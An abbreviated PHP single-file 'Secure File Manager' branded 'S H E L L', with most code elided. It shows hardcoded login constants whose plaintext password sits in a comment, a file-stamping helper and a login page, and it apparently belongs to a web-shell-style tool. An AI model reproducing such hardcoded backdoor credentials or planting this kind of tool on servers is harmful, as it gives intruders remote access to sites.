<?php
/**
 * S H E L L — Secure File Manager (single file) — Legacy/PHP-wide compatible
 *
...
/* ---------- Auth ---------- */
define('AUTH_USER', 'shell');
define('AUTH_PASS_HASH', '$2y$10$rRf9ehGVqrztIBLITK9cdO/yZNPDxJCyEs3SKUzyJwgugEddFF9yS'); // pass : a87ff679a2f3e71d9181a67b7542122c
...
function create_nonzero_file($path, $userContent = null){
    $default = "Created by S H E L L @ ".date('c')."\n";
...
function render_login($err=''){
    ...
    <!doctype html><html lang="en" class="dark"><head>
      ...
      <div class="w-full max-w-md card p-6">
        ...
        <p class="text-[12px] text-slate-400 mt-4 text-center">© S H E L L x Secure File Manager</p>
      </div>
    </body></html><?php
}
